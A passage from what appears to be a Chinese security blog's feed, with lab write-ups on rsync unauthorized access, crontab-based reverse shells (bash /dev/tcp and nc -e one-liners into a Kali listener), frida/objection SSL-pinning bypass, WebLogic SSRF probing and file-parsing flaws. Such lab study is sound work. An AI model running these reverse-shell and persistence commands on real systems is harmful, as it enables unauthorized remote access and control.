192.168.25.129::src/tmp/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/7e0e/7_4.png" class><h3 id="5、下载对方定时任务文件crontab到-root目录下"><a href="#5、下载对方定时任务文件crontab到-root目录下" class="headerlink" title="5、下载对方定时任务文件crontab到/root目录下"></a>5、下载对方定时任务文件crontab到/root目录下</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">rsync</span> -av 192.168.25.129::src/etc/crontab /root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/7e0e/7_5.png" class><h3 id="6、在crontab文件末尾写入命令"><a href="#6、在crontab文件末尾写入命令" class="headerlink" title="6、在crontab文件末尾写入命令"></a>6、在crontab文件末尾写入命令</h3><pre class="line-numbers language-bash"><code class="language-bash">*/1 * * * * root /tmp/111.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>    保存并退出</p><img src="/posts/7e0e/7_6.png" class><h3 id="7、设置监听端口"><a href="#7、设置监听端口" class="headerlink" title="7、设置监听端口"></a>7、设置监听端口</h3><p>    在kali上另外开一个命令行窗口，监听9999端口：nc -lvnp 9999</p><img src="/posts/7e0e/7_7.png" class><h3 id="8、将crontab文件上传到目标靶机"><a href="#8、将crontab文件上传到目标靶机" class="headerlink" title="8、将crontab文件上传到目标靶机"></a>8、将crontab文件上传到目标靶机</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">rsync</span> -av <span class="token function">crontab</span> 192.168.25.129::src/etc/crontab<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/7e0e/7_8.png" class><h3 id="9、在监听端口处可以看到成功获得反弹shell"><a href="#9、在监听端口处可以看到成功获得反弹shell" class="headerlink" title="9、在监听端口处可以看到成功获得反弹shell"></a>9、在监听端口处可以看到成功获得反弹shell</h3><img src="/posts/7e0e/7_9.png" class>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>未授权访问</tag>
      
      <tag>任意文件上传</tag>
      
      <tag>任意文件下载</tag>
      
      <tag>计划任务反弹shell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>反弹shell与计划任务</title>
    <link href="/posts/192.html"/>
    <url>/posts/192.html</url>
    
    <content type="html"><![CDATA[<p>关于在kali和Ubuntu测试反弹shell和利用计划任务进行反弹shell~~</p><span id="more"></span><h1 id="00x0-前言"><a href="#00x0-前言" class="headerlink" title="00x0 前言"></a>00x0 前言</h1><p>    不知道为什么我之前练习的靶场中关于反弹shell，都是不成功，找了很多原因，很头疼。觉得还是要从根源找原因，然后认真的记录了一下关于反弹shell和利用计划任务进行反弹shell的原理。用centos作为靶机环境没那么麻烦，但我用的Ubuntu，问就是不想再下个centos的镜像了呜呜呜。</p><h1 id="00x1反弹shell"><a href="#00x1反弹shell" class="headerlink" title="00x1反弹shell"></a>00x1反弹shell</h1><p>    对于正向连接和反弹shell，我浅显地理解为：</p><p>    正向连接：先在靶机上监听端口，或者靶机上开放了某个特殊端口，然后在攻击机上进行连接利用。</p><p>    反向连接：先在攻击机上监听端口，然后在靶机上发送请求命令到攻击机，使靶机的命令行反弹到攻击机中。</p><blockquote><p>kali：192.168.25.128</p><p>Ubuntu：192.168.25.129</p></blockquote><h2 id="1、bash反弹"><a href="#1、bash反弹" class="headerlink" title="1、bash反弹"></a>1、bash反弹</h2><p>    kali作为攻击机，Ubuntu作为靶机</p><p>（1） 先在kali上监听端口</p><pre class="line-numbers language-bash"><code class="language-bash">nc -lvnp 9999<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）在Ubuntu上输入反弹shell命令</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/192.168.25.128/9999 0<span class="token operator">></span><span class="token operator">&amp;</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>  <img src="/posts/192/1.png" class></p><h2 id="2、nc反弹"><a href="#2、nc反弹" class="headerlink" title="2、nc反弹"></a>2、nc反弹</h2><p>    因为这里Ubuntu不能使用nc -e命令，所以将kali作为靶机，Ubuntu作为攻击机。</p><p>（1）Ubuntu上监听9999端口</p><pre class="line-numbers language-bash"><code class="language-bash">nc -lvnp 9999<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）kali靶机执行命令将自己终端送出去</p><pre class="line-numbers language-bash"><code class="language-bash">nc -e /bin/bash 192.168.25.129 9999<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>  <img src="/posts/192/1_2.png" class></p><h1 id="00x2-计划任务"><a href="#00x2-计划任务" class="headerlink" title="00x2 计划任务"></a>00x2 计划任务</h1><h2 id="1、crontab命令格式"><a href="#1、crontab命令格式" class="headerlink" title="1、crontab命令格式"></a>1、crontab命令格式</h2><p>    crontab的命令构成为时间+动作，格式：* * * * * xxx，这里的*就代表一个时间维度的划分（时间维度依次是分、时、日、月、周这五种），xxx代表动作。</p><pre class="line-numbers language-bash"><code class="language-bash">例如：*/1 * * * * <span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> dev/tcp/192.168.25.128/9999 0<span class="token operator">></span><span class="token operator">&amp;</span>1 就表示在一分钟内执行后面的命令。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2、计划任务目录"><a href="#2、计划任务目录" class="headerlink" title="2、计划任务目录"></a>2、计划任务目录</h2><pre class="line-numbers language-bash"><code class="language-bash"> 系统级的计划任务目录：/etc/crontab 用户级的计划任务目录：     centos计划任务目录：/var/spool/cron/     ubuntu计划任务目录：/var/spool/cron/crontabs/     用户级的计划任务目录下存放的是每个用户包括root的crontab任务，每个任务以创建者的名字命名。 计划任务日志<span class="token punctuation">(</span>系统日志<span class="token punctuation">)</span>：/var/log/syslog<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3、crontab常用命令及参数"><a href="#3、crontab常用命令及参数" class="headerlink" title="3、crontab常用命令及参数"></a>3、crontab常用命令及参数</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">crontab</span> -e <span class="token comment" spellcheck="true">#编辑计划任务</span><span class="token function">crontab</span> -l <span class="token comment" spellcheck="true">#列出计划任务</span><span class="token function">crontab</span> -r <span class="token comment" spellcheck="true">#删除计划任务</span>注意：这里针对的都是用户级的计划任务，系统级的直接在/etc/crontab中编辑删除即可。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="00x3-利用计划任务反弹shell"><a href="#00x3-利用计划任务反弹shell" class="headerlink" title="00x3 利用计划任务反弹shell"></a>00x3 利用计划任务反弹shell</h1><blockquote><p>kali：192.168.25.128</p><p>Ubuntu：192.168.25.129</p></blockquote><blockquote><p>centos计划任务目录：/var/spool/cron/</p><p>ubuntu计划任务目录：/var/spool/cron/crontabs/</p><p>系统级计划任务目录：/etc/crontabS</p></blockquote><p>记得先在攻击机kali上监听端口！！！</p><h2 id="1、方法一：使用crontab-e写入命令"><a href="#1、方法一：使用crontab-e写入命令" class="headerlink" title="1、方法一：使用crontab -e写入命令"></a>1、方法一：使用crontab -e写入命令</h2><p>    这种方式，就是利用crontab -e命令，写入计划任务。实际上就是会自动在计划任务目录下创建了一个以当前用户名为名称的文件，文件的内容就是前面写入的计划任务。</p><h3 id="（1）在kali监听端口23333"><a href="#（1）在kali监听端口23333" class="headerlink" title="（1）在kali监听端口23333"></a>（1）在kali监听端口23333</h3><pre class="line-numbers language-bash"><code class="language-bash">nc -lvnp 23333<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="（2）在Ubuntu上输入crontab-e，这里选择2号编辑器，写入命令并保存"><a href="#（2）在Ubuntu上输入crontab-e，这里选择2号编辑器，写入命令并保存" class="headerlink" title="（2）在Ubuntu上输入crontab -e，这里选择2号编辑器，写入命令并保存"></a>（2）在Ubuntu上输入crontab -e，这里选择2号编辑器，写入命令并保存</h3><pre class="line-numbers language-bash"><code class="language-bash">centos输入以下命令：*/1 * * * * <span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> dev/tcp/192.168.25.128/9999 0<span class="token operator">></span><span class="token operator">&amp;</span>1Ubuntu输入以下命令：*/1 * * * * <span class="token function">bash</span> -c <span class="token string">"bash -i >&amp; /dev/tcp/192.168.25.128/23333 0>&amp;1"</span>至于-i参数前的bash还可以为bin/bash，至于使用哪个，可以使用echo <span class="token variable">$0</span>命令，查看当前窗口的shell是哪个，就用哪个。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> <img src="/posts/192/3.png" class></p><h3 id="（3）使用crontab-l命令，可以列出计划任务"><a href="#（3）使用crontab-l命令，可以列出计划任务" class="headerlink" title="（3）使用crontab -l命令，可以列出计划任务"></a>（3）使用crontab -l命令，可以列出计划任务</h3><p>  <img src="/posts/192/3_2.png" class></p><p>    在ubuntu的计划任务目录/var/spool/cron/crontabs下多了一个root文件。该文件下的内容就是之前写入的反弹shell内容。这里我是使用的root用户写入的计划任务，所以生成的是以root为名称的文件，当使用其他普通用户创建时，生成的则是以其他用户命名的文件名称。</p><p>   <img src="/posts/192/3_3.png" class></p><h3 id="（4）成功反弹shell"><a href="#（4）成功反弹shell" class="headerlink" title="（4）成功反弹shell"></a>（4）成功反弹shell</h3><p>   <img src="/posts/192/3_4.png" class></p><h2 id="2、方法二：使用echo写入文件到用户级的计划任务"><a href="#2、方法二：使用echo写入文件到用户级的计划任务" class="headerlink" title="2、方法二：使用echo写入文件到用户级的计划任务"></a>2、方法二：使用echo写入文件到用户级的计划任务</h2><p>    使用echo命令直接写入反弹shell命令到计划任务目录中的文件中。其中，可以将反弹shell先写入一个sh文件（注意这里的sh文件要赋予执行权限），然后再执行echo命令。使用echo重定向生成的root目录或其他用户名的目录在Ubuntu系统中要改权限为600。</p><p>重定向符&gt;与&gt;&gt;区别：</p><p>    1）echo ‘xxx’ &gt; 2.txt（就是将xxx的内容重定向到2.txt中，使用重定向符&gt;表示如果2.txt不存在则会创建，如果存在，会覆盖2.txt之前的内容。）</p><p>    2）echo ‘xxx’ &gt;&gt; 2.txt （同样是将1.txt的内容重定向到2.txt中，使用重定向符&gt;&gt;表示如果2.txt不存在则创建，如果存在，会将1.txt的内容添加到2.txt原来内容的后面，不会覆盖。所以写入到系统级计划任务最好使用&gt;&gt;重定向符，避免覆盖之前的内容。）</p><h3 id="（1）先在kali监听端口22222"><a href="#（1）先在kali监听端口22222" class="headerlink" title="（1）先在kali监听端口22222"></a>（1）先在kali监听端口22222</h3><pre class="line-numbers language-bash"><code class="language-bash">nc -lvnp 22222<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="（2）直接在靶机上输入如下命令"><a href="#（2）直接在靶机上输入如下命令" class="headerlink" title="（2）直接在靶机上输入如下命令"></a>（2）直接在靶机上输入如下命令</h3><pre class="line-numbers language-bash"><code class="language-bash">centos：    <span class="token keyword">echo</span> <span class="token string">'*/1 * * * * bash -i >&amp; /dev/tcp/192.168.25.128/11111 0>&amp;1'</span> <span class="token operator">></span> /var/spool/cron/rootUbuntu：    <span class="token keyword">echo</span> <span class="token string">'*/1 * * * * bash -c "bash -i >&amp; /dev/tcp/192.168.25.128/11111 0>&amp;1"'</span> <span class="token operator">></span> /var/spool/cron/crontabs/root<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或者</p><p>    先在tmp目录下创建一个sh文件，这里创建111.sh，并写入以下内容：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">bash</span> -c <span class="token string">"bash -i >&amp; /dev/tcp/192.168.25.128/11111 0>&amp;1"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>    这里也要注意，这个111.sh要赋予执行权限，chmod +x 111.sh才行！</p><p>    然后使用echo命令：    </p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">echo</span> <span class="token string">"*/1 * * * * /tmp/111.sh"</span> <span class="token operator">></span> /var/spool/cron/crontabs/root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>   <img src="/posts/192/4.png" class></p><p>    其中的root，根据方法一可知，可以替换为其他用户的名称。</p><h3 id="（3）使用crontab-l查看计划任务是否写入成功"><a href="#（3）使用crontab-l查看计划任务是否写入成功" class="headerlink" title="（3）使用crontab -l查看计划任务是否写入成功"></a>（3）使用crontab -l查看计划任务是否写入成功</h3><p>   <img src="/posts/192/4_2.png" class></p><h4 id="（4）反弹shell成功"><a href="#（4）反弹shell成功" class="headerlink" title="（4）反弹shell成功"></a>（4）反弹shell成功</h4><p>    到这里，centos应该反弹成功了，但是，Ubuntu还不行。使用echo创建的root文件权限默认为644，而计划任务的root文件权限必须为600。</p><pre class="line-numbers language-bash"><code class="language-bash">所以先改权限为600：chmod 600 root然后重启cron服务即可：systemctl restart <span class="token function">cron</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>   <img src="/posts/192/4_3.png" class></p><p>    反弹shell成功：</p><p>   <img src="/posts/192/4_4.png" class></p><h2 id="3、方法三：echo写入文件到系统级的计划任务"><a href="#3、方法三：echo写入文件到系统级的计划任务" class="headerlink" title="3、方法三：echo写入文件到系统级的计划任务"></a>3、方法三：echo写入文件到系统级的计划任务</h2><p>    这里跟写入到用户级的差不多，只是在计划任务处需要添加用户名，而且是直接写入到系统级计划任务目录/etc/crontab中，所以记得使用&gt;&gt;重定向符。也可以同样先创建sh文件并赋予执行权限后，使用echo命令写入到计划任务中。</p><h3 id="（1）先在kali监听端口33333"><a href="#（1）先在kali监听端口33333" class="headerlink" title="（1）先在kali监听端口33333"></a>（1）先在kali监听端口33333</h3><pre class="line-numbers language-bash"><code class="language-bash">nc -lvnp 33333<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="（2）直接在靶机上输入如下命令-1"><a href="#（2）直接在靶机上输入如下命令-1" class="headerlink" title="（2）直接在靶机上输入如下命令"></a>（2）直接在靶机上输入如下命令</h3><pre class="line-numbers language-bash"><code class="language-bash">centos：    <span class="token keyword">echo</span> <span class="token string">'*/1 * * * * root bash -i >&amp; /dev/tcp/192.168.25.128/33333 0>&amp;1'</span> <span class="token operator">>></span> /etc/crontabUbuntu：    <span class="token keyword">echo</span> <span class="token string">'*/1 * * * * root bash -c "bash -i >&amp; /dev/tcp/192.168.25.128/33333 0>&amp;1"'</span> <span class="token operator">>></span> /etc/crontab（这里使用<span class="token operator">>></span>是将内容接着写入到/etc/crontab，而<span class="token operator">></span>是直接覆盖之前的文件，所以这里用<span class="token operator">>></span>重定向符）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>   <img src="/posts/192/5.png" class></p><p>或者</p><p>    先在tmp目录下创建一个sh文件，这里创建222.sh，并写入以下内容：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">bash</span> -c <span class="token string">"bash -i >&amp; /dev/tcp/192.168.25.128/33333 0>&amp;1"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>    这里也要注意，这个222.sh要赋予执行权限，chmod +x /tmp/222.sh才行！</p><p>    然后使用echo命令：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">echo</span> <span class="token string">"*/1 * * * * root /tmp/222.sh"</span> <span class="token operator">>></span> /etc/crontab<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>   <img src="/posts/192/5_2.png" class></p><h3 id="（3）反弹shell成功"><a href="#（3）反弹shell成功" class="headerlink" title="（3）反弹shell成功"></a>（3）反弹shell成功</h3><p>  <img src="/posts/192/5_3.png" class></p>]]></content>
    
    
    <categories>
      
      <category>内网渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>反弹shell</tag>
      
      <tag>计划任务</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>frida+objection绕过SSL Pinning</title>
    <link href="/posts/7071.html"/>
    <url>/posts/7071.html</url>
    
    <content type="html"><![CDATA[<p>绕过单向认证又多了一种尝试方式呢</p><span id="more"></span><h1 id="环境："><a href="#环境：" class="headerlink" title="环境："></a>环境：</h1><p>夜神模拟器 Android7 32位</p><p>burpsuite</p><h1 id="前提："><a href="#前提：" class="headerlink" title="前提："></a>前提：</h1><p>    已经在模拟器上配置了网络，并下载了证书。</p><p> <img src="/posts/7071/1.png" class></p><p>     在burp上面设置了同样地址和端口的代理：</p><p> <img src="/posts/7071/2.png" class></p><p>    配置代理+安装burp证书，只能满足于一部分的app截获数据包。但是对于大部分app而言，要通过其他方式绕过。</p><p>    这里采用frida+objection绕过app的ssl证书校验。当app采用单向认证时，可以使用此种方式尝试绕过。即客户端对服务器的证书进行了校验，而burp不能充当中间人的角色，拦截不到数据包，这里要做的就是在客户端关闭这个认证。</p><p>（1）单项认证-客户端校验服务端的证书。</p><p>（2）双向认证-客户端和服务器双向认证。不仅客户端要校验服务端的证书，也会在 app 内放一张证书，服务端会校验客户端里的证书。</p><h1 id="1、下载frida-server"><a href="#1、下载frida-server" class="headerlink" title="1、下载frida-server"></a>1、下载frida-server</h1><pre class="line-numbers language-php"><code class="language-php">下载地址：https<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//github.com/frida/frida/releases</span>frida<span class="token operator">-</span>server<span class="token number">-16.0</span><span class="token punctuation">.</span><span class="token number">2</span><span class="token operator">-</span>android<span class="token operator">-</span>x86 （模拟器是<span class="token number">32</span>位的）frida<span class="token operator">-</span>server<span class="token number">-16.0</span><span class="token punctuation">.</span><span class="token number">2</span><span class="token operator">-</span>android<span class="token operator">-</span>x86_64 （<span class="token number">64</span>位）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="2、启动frida-server服务"><a href="#2、启动frida-server服务" class="headerlink" title="2、启动frida-server服务"></a>2、启动frida-server服务</h1><p>    将frida-server用adb复制到模拟器的/data/local/tmp目录下：</p><pre class="line-numbers language-php"><code class="language-php">adb push 本地frida<span class="token operator">-</span>server路径 <span class="token operator">/</span>data<span class="token operator">/</span>local<span class="token operator">/</span>tmp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>    然后赋予最高权限：</p><pre class="line-numbers language-php"><code class="language-php">chmod <span class="token number">777</span> 文件名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> <img src="/posts/7071/3.png" class></p><p>    最后使用如下命令，开启Frida server服务：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token punctuation">.</span><span class="token operator">/</span>文件名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> <img src="/posts/7071/4.png" class></p><h1 id="3、在本机安装frida和objection"><a href="#3、在本机安装frida和objection" class="headerlink" title="3、在本机安装frida和objection"></a>3、在本机安装frida和objection</h1><pre class="line-numbers language-php"><code class="language-php">在python3的环境下安装：安装frida：python3 <span class="token operator">-</span>m pip install frida<span class="token operator">-</span>tools  安装objection：python3 <span class="token operator">-</span>m pip install objection（加上 <span class="token operator">-</span>i https<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//pypi.tuna.tsinghua.edu.cn/simple some-package安装会快一些）</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="4、查看包名"><a href="#4、查看包名" class="headerlink" title="4、查看包名"></a>4、查看包名</h1><p>    在本机上使用如下命令验证frida安装成功，顺便查看需要测试的包名</p><pre class="line-numbers language-php"><code class="language-php">frida<span class="token operator">-</span>ps <span class="token operator">-</span>U<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> <img src="/posts/7071/5.png" class></p><h1 id="5、启动objection"><a href="#5、启动objection" class="headerlink" title="5、启动objection"></a>5、启动objection</h1><p>    保证Frida server开启后，在cmd中输入：</p><pre class="line-numbers language-php"><code class="language-php">objection <span class="token operator">-</span>g 程序包名 explore<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> <img src="/posts/7071/6.png" class></p><h1 id="6、绕过APP的SSL-Pinning"><a href="#6、绕过APP的SSL-Pinning" class="headerlink" title="6、绕过APP的SSL Pinning"></a>6、绕过APP的SSL Pinning</h1><pre class="line-numbers language-php"><code class="language-php">android sslpinning disable<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>    成功绕过：</p><p> <img src="/posts/7071/7.png" class></p><p>    注意成功之后，当退出应用即结束本次会话再进来，则可能又会抓取不到数据包。所以要重新进入程序时，结束之前的运行窗口，重新启动objection。</p>]]></content>
    
    
    <categories>
      
      <category>Android渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>frida</tag>
      
      <tag>objection</tag>
      
      <tag>android抓包</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>weblogic SSRF漏洞</title>
    <link href="/posts/537d.html"/>
    <url>/posts/537d.html</url>
    
    <content type="html"><![CDATA[<p>关于weblogic的ssrf漏洞验证~~</p><span id="more"></span><h1 id="00x1漏洞描述"><a href="#00x1漏洞描述" class="headerlink" title="00x1漏洞描述"></a>00x1漏洞描述</h1><p>    weblogic中存在SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。</p><h1 id="00x2-影响版本"><a href="#00x2-影响版本" class="headerlink" title="00x2 影响版本"></a>00x2 影响版本</h1><p>    weblogic 10.0.2-10.3.6版本</p><h1 id="00x3-漏洞复现"><a href="#00x3-漏洞复现" class="headerlink" title="00x3 漏洞复现"></a>00x3 漏洞复现</h1><p>    这里使用的是vulfocus[<a href="https://vulfocus.cn/#/dashboard]%E7%9A%84weblogic%E9%9D%B6%E5%9C%BA%E3%80%82">https://vulfocus.cn/#/dashboard]的weblogic靶场。</a></p><p>    启动靶场，是404的环境，我刚开始还以为是环境没加载出来，原来可以直接访问uddiexplorer应用。</p><pre class="line-numbers language-php"><code class="language-php">访问：http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//ip:端口/uddiexplorer/，无需登录即可查看uddiexplorer应用。</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/537d/1.png" class><p>    漏洞存在于search public registries中，访问url：</p><pre class="line-numbers language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//123.58.224.8:31691/uddiexplorer/SearchPublicRegistries.jsp</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>    点击搜索的同时用burp抓包：</p><img src="/posts/537d/2.png" class><p>    在参数operator处存在漏洞：</p><img src="/posts/537d/3.png" class><h3 id="（1）探测存活ip"><a href="#（1）探测存活ip" class="headerlink" title="（1）探测存活ip"></a>（1）探测存活ip</h3><p>    这里直接探测肯定存在的host的ip：</p><pre class="line-numbers language-php"><code class="language-php">payload：operator<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//123.58.224.8</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>    响应表示该ip存在：</p><img src="/posts/537d/4.png" class><p>    若ip不存在：</p><pre class="line-numbers language-php"><code class="language-php">payload：operator<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//1.1.1.1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>    则响应为：</p><img src="/posts/537d/5.png" class><h3 id="（2）探测开放端口-payload"><a href="#（2）探测开放端口-payload" class="headerlink" title="（2）探测开放端口 payload"></a>（2）探测开放端口 payload</h3><pre class="line-numbers language-php"><code class="language-php">payload：operator<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//123.58.224.8:80</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>    若80端口存在，则会响应为：</p><img src="/posts/537d/6.png" class><pre class="line-numbers language-php"><code class="language-php">payload：operator<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//123.58.224.8:6379</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>    若6379端口不存在，则会响应为：</p><img src="/posts/537d/7.png" class><p>    如果6379端口开放，即redis服务，可以尝试利用反弹shell写入payload加以利用。</p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>框架漏洞</tag>
      
      <tag>weblogic</tag>
      
      <tag>SSRF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>常见文件解析漏洞</title>
    <link href="/posts/7351.html"/>
    <url>/posts/7351.html</url>
    
    <content type="html"><![CDATA[<p>前段时间在复习文件解析漏洞，有些知识的确得记清呀~~</p><span id="more"></span><h1 id="00x0-前言"><a href="#00x0-前言" class="headerlink" title="00x0 前言"></a>00x0 前言</h1><p>    解析漏洞主要是指攻击者利用一些服务器的特性，精心构造的文件后缀被服务器解析为脚本文件，从而导致网站沦陷。</p><h1 id="00x1-Apache"><a href="#00x1-Apache" class="headerlink" title="00x1 Apache"></a>00x1 Apache</h1><h2 id="1、phpcgi漏洞"><a href="#1、phpcgi漏洞" class="headerlink" title="1、phpcgi漏洞"></a>1、phpcgi漏洞</h2><pre class="line-numbers language-php"><code class="language-php">test<span class="token punctuation">.</span>jpg<span class="token operator">/</span>x<span class="token punctuation">.</span>php         其中，x<span class="token punctuation">.</span>php是不存在的文件，所以会向前递归解析，而test<span class="token punctuation">.</span>jpg会被当做php文件执行。此时<span class="token punctuation">,</span>可以修改请求包将test<span class="token punctuation">.</span>jpg的内容替换为php的内容，或者上传图片马。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2、Apache陌生后缀解析漏洞"><a href="#2、Apache陌生后缀解析漏洞" class="headerlink" title="2、Apache陌生后缀解析漏洞"></a>2、Apache陌生后缀解析漏洞</h2><pre class="line-numbers language-php"><code class="language-php">test<span class="token punctuation">.</span>php<span class="token punctuation">.</span>aaaApache <span class="token number">1</span><span class="token punctuation">.</span>x<span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">.</span>x版本因为Apache判断文件后缀是从右往左的，所以遇到aaa不认识，就会继续向左解析，直到遇到认识的后缀。此时随意编写字符串作为后缀即可绕过黑名单检测。如果白名单中设置了Apache不认识的后缀，则也可绕过白名单检测。（关于具体的Apache不认识的后缀可以在Apache路径下的conf的mime<span class="token punctuation">.</span>types文件中查看。）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3、Apache换行解析漏洞"><a href="#3、Apache换行解析漏洞" class="headerlink" title="3、Apache换行解析漏洞"></a>3、Apache换行解析漏洞</h2><pre class="line-numbers language-php"><code class="language-php">test<span class="token punctuation">.</span>php<span class="token operator">%</span>0a<span class="token operator">%</span>0a是换行符，Apache会直接忽略，当test<span class="token punctuation">.</span>php<span class="token operator">%</span>0a不在黑名单中时，可绕过黑名单检测。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="00x2-IIS"><a href="#00x2-IIS" class="headerlink" title="00x2 IIS"></a>00x2 IIS</h1><h2 id="1、phpcgi漏洞-1"><a href="#1、phpcgi漏洞-1" class="headerlink" title="1、phpcgi漏洞"></a>1、phpcgi漏洞</h2><pre class="line-numbers language-php"><code class="language-php">test<span class="token punctuation">.</span>jpg<span class="token operator">/</span>x<span class="token punctuation">.</span>asp<span class="token constant">IIS</span> <span class="token number">7.0</span><span class="token operator">/</span><span class="token number">7.5</span>版本 且fast<span class="token operator">-</span>cgi默认开启和Apache的phpcgi漏洞一样的道理，x<span class="token punctuation">.</span>asp是不存在的文件，所以会向前递归解析，而test<span class="token punctuation">.</span>jpg会被当做asp文件执行。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2、IIS分号漏洞"><a href="#2、IIS分号漏洞" class="headerlink" title="2、IIS分号漏洞"></a>2、IIS分号漏洞</h2><pre class="line-numbers language-php"><code class="language-php">test1<span class="token punctuation">.</span>asp<span class="token punctuation">;</span>test2<span class="token punctuation">.</span>jpg 或 test1<span class="token punctuation">.</span>asp<span class="token punctuation">;</span><span class="token punctuation">.</span>jpg<span class="token constant">IIS</span> <span class="token number">6.0</span>版本<span class="token constant">IIS</span>会将分号后的内容丢弃，所以会以asp脚本来执行。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3、目录解析漏洞"><a href="#3、目录解析漏洞" class="headerlink" title="3、目录解析漏洞"></a>3、目录解析漏洞</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">/</span>test1<span class="token punctuation">.</span>asp<span class="token operator">/</span>test2<span class="token punctuation">.</span>jpg<span class="token constant">IIS</span> <span class="token number">6.0</span>版本如果网站目录下有一个“test1<span class="token punctuation">.</span>asp”的文件夹，那么该文件夹下的一切内容都会当做asp脚本来执行。默认的可执行文件除了asp之外还包括：<span class="token operator">/</span>test<span class="token punctuation">.</span>asa<span class="token operator">/</span>test<span class="token punctuation">.</span>cer<span class="token operator">/</span>test<span class="token punctuation">.</span>cdx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="00x3-Nginx"><a href="#00x3-Nginx" class="headerlink" title="00x3 Nginx"></a>00x3 Nginx</h1><h2 id="1、phpcgi漏洞-2"><a 